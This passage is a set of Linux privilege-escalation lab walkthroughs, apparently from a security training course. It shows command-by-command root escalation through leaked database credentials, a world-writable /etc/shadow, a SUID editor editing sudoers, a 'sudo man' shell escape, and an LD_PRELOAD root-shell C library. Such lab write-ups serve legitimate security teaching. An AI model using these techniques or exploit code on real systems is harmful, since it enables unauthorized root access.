upgrade_feed.php:63:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
include/common.inc.php:115:  $pwg_db_link = pwg_db_connect($conf['db_host'], $conf['db_user'],
local/config/database.inc.php:4:$conf['db_user'] = 'root'; ←
install.php:270:$conf[\'db_user\'] = \''.$dbuser.'\';
```

**Explanation:** This search identifies the `database.inc.php` file as containing database credentials, specifically showing that the database user is `root`. It’s worth investigating further to see if the corresponding password is stored here as well.

_Display the contents of the database configuration file to view the stored credentials._

`cat ./local/config/database.inc.php`:
```
<?php
$conf['dblayer'] = 'mysql';
$conf['db_base'] = 'piwigo';
$conf['db_user'] = 'root';
$conf['db_password'] = 'w3lc0m3t0adlabs'; ←
$conf['db_host'] = 'localhost';

$prefixeTable = 'piwigo_';

define('PHPWG_INSTALLED', true);
define('PWG_CHARSET', 'utf-8');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
```

_**Explanation:** The `cat` command reveals the contents of `database.inc.php`, showing the database username `root` and password `w3lc0m3t0adlabs`. These credentials can now be used to escalate privileges._

_Switch to the root user by using the `su` command and entering the database password._

`su`:
```
Password: ←
```

_Verify that you now have root privileges._

`whoami`:
```
root ←
```

_Search for the flag file on the system using the `find` command._

`find /iname "*flag"`:
```
find: '/proc/tty/driver': Permission denied
find: '/proc/1/task/1/fdinfo': Permission denied
find: '/proc/1/map_files': Permission denied
find: '/proc/1/fdinfo': Permission denied
find: '/proc/7/task/7/fdinfo': Permission denied
find: '/proc/7/task/8/fdinfo': Permission denied
find: '/proc/7/map_files': Permission denied
find: '/proc/7/fdinfo': Permission denied
find: '/proc/9/task/9/fdinfo': Permission denied
find: '/proc/9/map_files': Permission denied
find: '/proc/9/fdinfo': Permission denied
find: '/proc/23/task/23/fdinfo': Permission denied
find: '/proc/23/map_files': Permission denied
find: '/proc/23/fdinfo': Permission denied
/root/flag ←
```

_Display the contents of the flag file to retrieve it._

`cat /root/flag`:
```
760a582ebd219e2efb6dec173d416723 ←
```

### Misconfigured File Permissions - Theory/Lab

#### Lab Environment

The admin was tasked to create a replica of an existing Linux system. He copied the entire filesystem to his computer, made modifications to some files and then copied it onto the newly provisioned system. Unfortunately, in his haste to set the new system up, he forgot to take care of permission sets. 

**Your mission is to get a root shell on the box**and retrieve the flag!

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current user to confirm you are operating as the "student" user on the target machine._

`whoami`:
```
student ←
```

_Check the groups the current user belongs to, which may provide insight into the user’s privileges._

`groups student`:
```
student : student
```

**Explanation:** The `groups` command shows that the user only belongs to the `student` group, suggesting limited privileges. However, improperly set file permissions could still offer a path to privilege escalation.

_Search the filesystem for files that are world-writable (`-perm -o+w`), excluding symbolic links (`-not -type l`). These files could be altered by any user on the system, potentially allowing for privilege escalation._

`find / -not -type l -perm -o+w`:
```
/tmp
find: '/var/lib/apt/lists/partial': Permission denied
/var/tmp
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
/proc/sys/kernel/ns_last_pid
find: '/proc/tty/driver': Permission denied
/proc/acpi
/proc/keys
/proc/scsi
/proc/kcore
/proc/pressure/io
/proc/pressure/cpu
/proc/pressure/memory
/proc/timer_list
/proc/latency_stats
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate

...

/proc/13/attr/apparmor/current
/proc/13/attr/apparmor/exec
/proc/13/timerslack_ns
/run/lock
/sys/firmware
find: '/root': Permission denied
/dev/pts/ptmx
/dev/mqueue
/dev/shm
/dev/null
/dev/random
/dev/full
/dev/tty
/dev/zero
/dev/urandom
/etc/shadow ←
find: '/etc/ssl/private': Permission denied
```

**Explanation:** The `find` command identifies `/etc/shadow` as a world-writable file. This file stores user password hashes and should be readable only by the root user. The fact that it is writable by any user represents a significant security vulnerability.

_List the details of the `/etc/shadow` file to confirm its permissions._

`ls -alps /etc/shadow`:
```
4 -rw-rw-rw- 1 root shadow 523 Sep 23  2018 /etc/shadow ←
```

**Explanation:** The permissions `-rw-rw-rw-` indicate that any user on the system can read and write to the `/etc/shadow` file. This is a critical misconfiguration, as it allows non-privileged users to modify or replace the file's contents.

_Display the contents of the `/etc/shadow` file to access user password hashes._

`cat /etc/shadow`:
```
root:*:17764:0:99999:7::: ←
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
```

**Explanation:** The `cat` command reveals the contents of `/etc/shadow`, including the root user's password hash. However, instead of attempting to crack the hash, a quicker approach is to replace it with a known hash.

_Generate a new password hash using OpenSSL to replace the root password._

`openssl passwd -1 -salt "abc" "P@ssw0rd1"`:
```
$1$abc$Next0mRKDm6uD6FWwkFD7/ ←
```

**Explanation:** The `openssl passwd` command generates an MD5 hashed password (`$1$` indicates MD5) with the salt "abc" and password "P@ssw0rd1". The resulting hash can be inserted into `/etc/shadow` to replace the root password.

_Edit the `/etc/shadow` file and replace the root user’s password hash with the newly generated one._

`vim /etc/shadow`:
```
root:$1$abc$Next0mRKDm6uD6FWwkFD7/:17764:0:99999:7::: ←
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
```

**Explanation:** By editing `/etc/shadow` with `vim`, you replace the root user’s password hash with the one generated earlier. This effectively changes the root password to "P@ssw0rd1".

_Switch to the root user by using the `su` command and entering the new password._

`su`:
```
Password: ←
```

_Verify that you now have root privileges._

`whoami`:
```
root ←
```

_Search for the flag file on the system using the `find` command._

`find / -iname "*flag*"`:
```
/sys/devices/pnp0/00:02/00:02:0/00:02:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.16/tty/ttyS16/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags

...

/sys/devices/platform/serial8250/serial8250:0/serial8250:0.18/tty/ttyS18/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.5/tty/ttyS5/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.26/tty/ttyS26/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/ip_vti0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/root/flag ←
```

_Display the contents of the flag file to retrieve it._

`cat /root/flag`:
```
e62ab67ddff744d60cbb6232feaefc4d ←
```

### SUID Binaries - Theory

#### Exploiting SUID Binaries

In addition to the three main file access permissions (read, write and execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set Owner User ID) permission.

When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.

SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with root permissions. It is to be noted, however, that the provision of elevate privileges is limited to the execution of the script and does not translate to elevation of privileges, however, if improperly configured unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session.

This is the functionality that we will be attempting to exploit in order to elevate our privileges, however, the success of our attack will depend on the following factors:
- **Owner of the SUID binary** – Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the “root” user or other privileged users.
- **Access permissions** – We will require executable permissions in order to execute the SUID binary.

### SUID Binaries - Lab

#### Lab Environment

As you've seen in another challenge in this category, setuid programs can provide great power and flexibility, but if not secured properly, can easily lead to a full system compromise.

**Your mission is to get a root shell on the box** and retrieve the flag!

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current user to ensure you are operating as the "student" user on the target machine._

`whoami`:
```
student ←
```

_Search the filesystem for binaries with the setuid bit set. These binaries run with the privileges of their owner, potentially root, which could be exploited for privilege escalation._

`find / -perm -u=s -type f 2> /dev/null`:
```
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/vim.tiny ←
/bin/mount
/bin/su
/bin/umount
```

**Explanation:** The `find` command locates files with the setuid bit set (`-perm -u=s`). Among the listed binaries, `vim.tiny` stands out because it's a text editor, which can potentially be leveraged to edit files as root.

_Use `vim.tiny` to open the `sudoers` file, which controls sudo privileges on the system._

`vim.tiny /etc/sudoers`:
```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL
student ALL=NOPASSWD:ALL ←

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```

**Explanation:** By using `vim.tiny`, which runs with elevated privileges due to the setuid bit, you can edit the `sudoers` file. Here, the line `student ALL=NOPASSWD:ALL` has been added, allowing the `student` user to run any command as root without requiring a password.

_Now that the `sudoers` file has been modified to grant the `student` user root privileges, use `sudo` to open a root shell_

`sudo /bin/bash`

_Verify that you now have root privileges._

`whoami`:
```
root ←
```

_Search for the flag file on the system using the `find` command._

`find / -iname "*flag*"`:
```
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change

...

/sys/devices/platform/serial8250/serial8250:0/serial8250:0.18/tty/ttyS18/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.5/tty/ttyS5/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.26/tty/ttyS26/flags
/sys/devices/virtual/net/ip_vti0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/root/flag ←
```

_Display the contents of the flag file to retrieve it._

`cat /root/flag`:
```
3e5b8997be1101e01c5c3ea792f69240 ←
```

### Misconfigured SUDO Privileges - Theory/Lab

#### Lab Environment

You have managed to get access to the "student" account on the client's server. This is bad enough as all the student resources are available to you. You are now trying to escalate privileges to get root. After some digging around and from other sources, you figure out that the same person in the organization uses both the student account and the root account on the system. 

Your mission is to escalate privileges, get a root shell on the box and retrieve the flag!

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current user to ensure you are operating as the "student" user on the target machine._

`whoami`:
```
student ←
```

_Check the `sudo` privileges available to the current user to identify any potential misconfigurations._

`sudo -l`:
```
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/bin/man ←
```

**Explanation:** The `sudo -l` command reveals that the `student` user can run the `man` command as root without needing a password. This is a potential privilege escalation vector because `man` can be abused to execute arbitrary commands as root.

_Learn more about the `man` command to understand its functionality._

`whatis`:
```
whatis what?
```

`whatis man`:
```
man (7)              - macros to format man pages
man (1)              - an interface to the on-line reference manuals
```

###### GTFOBins

![logo](https://gtfobins.github.io/assets/logo.png)

GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

The project collects legitimate [functions](https://gtfobins.github.io/functions/) of Unix binaries that can be abused to ~~get the f\*\*k~~ break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

It is important to note that this is **not** a list of exploits, and the programs listed here are not vulnerable per se, rather, GTFOBins is a compendium about how to live off the land when you only have certain binaries available.

[`man` > `sudo`](https://gtfobins.github.io/gtfobins/man/#sudo)

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
    sudo man man
    !/bin/sh
```

**Explanation:** According to GTFOBins, if the `man` binary is allowed to run as a superuser via `sudo`, it can be used to escalate privileges. Specifically, you can spawn a shell as root by using the `!` command within `man`.

_Use the `man` command with `sudo` to exploit the privilege escalation opportunity._

`sudo man man` > `!/bin/sh`

**Explanation:** By invoking `sudo man man`, and then entering `!/bin/sh`, you open a root shell. The `!` command in `man` allows you to run shell commands, and since `man` is running as root, so will the shell.

_Verify that you now have root privileges._

`whoami`:
```
root ←
```

_Locate the flag file on the system using the `find` command._

`find / -iname "*flag*" 2> /dev/null`:
```
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/pnp0/00:02/00:02:0/00:02:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.16/tty/ttyS16/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.24/tty/ttyS24/flags

...

/sys/devices/platform/serial8250/serial8250:0/serial8250:0.18/tty/ttyS18/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.5/tty/ttyS5/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.26/tty/ttyS26/flags
/sys/devices/virtual/net/ip_vti0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/root/flag ←
```

_Display the contents of the flag file to retrieve it._

`cat /root/flag`:
```
74f5cc752947ec8a522f9c49453b8e9a ←
```

### Shared Library Injection - Theory

#### Shared Library

In Linux, a shared library (also known as a dynamic library or dynamic shared object, typically with a .so extension) is a file that contains code and data that can be loaded by multiple processes at runtime.

Shared libraries allow code to be modular, reusable, and reduce memory usage, as multiple processes can use the same shared code.

#### Shared Library Injection

Shared library injection involves injecting a custom shared library into a running process to execute arbitrary code or manipulate the process's behavior.

This technique can be used for various purposes, such as debugging, monitoring, or, in the context of privilege escalation, executing code with higher privileges.

#### How Shared Library Injection Works

1. **Identify a Target Process**
The attacker identifies a running process with elevated privileges, such as a system service, daemon, or application running as root.

2. **Create a Malicious Shared Library**
The attacker creates a shared library containing the code they wish to execute. This code can include arbitrary payloads, backdoors, or other malicious activities designed to achieve privilege escalation.

3. **Inject the Shared Library into the Target Process**
Several techniques can be used to inject a shared library into a running process:
	 - **Using LD_PRELOAD:** This environment variable specifies a shared library to be loaded before any other libraries. By setting this variable, an attacker can preload a malicious shared library into a process.
	 - **Process Control (ptrace):** The ptrace system call allows a process to control another process, typically used for debugging. Attackers can use ptrace to inject code into a running process, causing it to load a malicious shared library.

### Shared Library Injection - Lab

#### Lab Environment

So you've got a foothold on a regular user account on a Linux box? You've tried to escalate privileges to root but nothing seems to work?  Remember the order in which programs, scripts and libraries load dictates what executes! 

**Your mission is to get a root shell on the box** and retrieve the flag!

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Verify the current user to confirm your identity on the target machine._

`whoami`:
```
student ←
```

_Check the user's UID (User ID), GID (Group ID), and group memberships to understand the privileges associated with the current account._

`id`:
```
uid=999(student) gid=999(student) groups=999(student) ←
```

_Look for any `sudo` privileges the user has, which might allow running certain commands as root without requiring a password._

`sudo -l`:
```
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD ←

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/sbin/apache2 ←
```

**Explanation:** The `sudo -l` command reveals that the `student` user can run the `apache2` service as root without a password. Importantly, the `env_keep+=LD_PRELOAD` directive is present, which means the `LD_PRELOAD` environment variable is preserved when using `sudo`. This opens a potential vector for Shared Library Injection.

_Check the current working directory._

`pwd`:
```
/home/student
```

_Create a C program (`shell.c`) that will exploit the `LD_PRELOAD` environment variable to spawn a root shell._

`vim shell.c`:
```c
#include <stdlib.h>   // Include standard library for system and unsetenv functions
#include <unistd.h>   // Include POSIX API for setuid and setgid functions

void _init() {
    unsetenv("LD_PRELOAD"); // Remove the LD_PRELOAD environment variable to avoid detection
    setuid(0);              // Set the user ID to root (UID 0)
    setgid(0);              // Set the group ID to root (GID 0)
    system("/bin/sh");      // Spawn a root shell
}
```

**Explanation:** This C program is designed to be compiled into a shared object (`.so`) file. When loaded into a process via `LD_PRELOAD`, it will remove the `LD_PRELOAD` environment variable (to evade detection), elevate privileges to root, and spawn a root shell.

_Compile the C program into a shared object file, which can be injected into the `apache2` process._

`gcc -fPIC -shared -o shell.o shell.c -nostartfiles`

**Explanation:** The `-fPIC` flag generates position-independent code suitable for use in a shared library, and `-shared` creates a shared object file. `-nostartfiles` omits standard startup files to create a minimal shared object suitable for injection.

_List the files in the current directory to confirm the creation of the shared object file._

`ls -alps`:
```
total 28
4 drwxr-xr-x 1 student student 4096 Aug 19 08:50 ./
8 drwxr-xr-x 1 root    root    4096 Sep 26  2018 ../
4 -rw------- 1 student student  801 Aug 19 08:49 .viminfo
4 -rw-r--r-- 1 student student  124 Aug 19 08:49 shell.c
8 -rwxr-xr-x 1 student student 6400 Aug 19 08:50 shell.o ←
```

_Use `sudo` to run the `apache2` service with the `LD_PRELOAD` environment variable set to the path of the malicious shared object file, thereby injecting it into the process._

`sudo LD_PRELOAD=/home/student/shell.o apache2`

**Explanation:** By setting `LD_PRELOAD` to the path of `shell.o`, the shared object is injected into the `apache2` process when it starts. This triggers the `_init` function in `shell.o`, which elevates privileges and spawns a root shell.

_Verify that the injection was successful by checking the current user._

`whoami`:
```
root ←
```

_Verify the effective user and group IDs to ensure full root access._

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

_Locate the flag file on the system using the `find` command._

`find / -iname "*flag*" 2> /dev/null`:
```
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/usr/include/linux/tty_flags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/include/x86_64-linux-gnu/bits/ss_flags.h
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/pnp0/00:02/00:02:0/00:02:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.16/tty/ttyS16/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.24/tty/ttyS24/flags

...

/sys/devices/platform/serial8250/serial8250:0/serial8250:0.18/tty/ttyS18/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.5/tty/ttyS5/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.26/tty/ttyS26/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/ip_vti0/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/root/flag ←
```

_Display the contents of the flag file to retrieve it._

`cat /root/flag`:
```
368b219937989a57d0c1191ac697cc83 ←
```

---
---
